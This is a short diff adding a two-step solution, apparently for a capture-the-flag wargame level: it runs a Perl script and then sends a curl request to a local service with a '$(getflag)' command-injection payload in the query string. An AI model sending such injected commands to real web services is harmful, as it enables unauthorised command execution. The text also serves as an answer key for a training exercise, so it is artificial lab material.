@@ -1,1 +1,2 @@
-
+Step 1: run "perl level04.pl"
+Step 2: run "curl localhost:4747?x=$\(getflag\)"
